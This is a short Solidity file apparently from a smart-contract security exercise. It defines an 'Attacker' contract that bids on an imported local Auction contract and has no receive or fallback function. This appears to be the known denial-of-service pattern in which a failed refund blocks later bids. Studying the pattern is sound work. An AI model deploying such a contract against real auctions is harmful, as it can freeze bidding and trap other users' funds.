// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "./N-Auction.sol";

contract Attacker{
    Auction auction;

    constructor(Auction _auctionaddr){
        auction = Auction(_auctionaddr);
    }

    function attack() public payable{
        auction.bid{value: msg.value}();
    }
}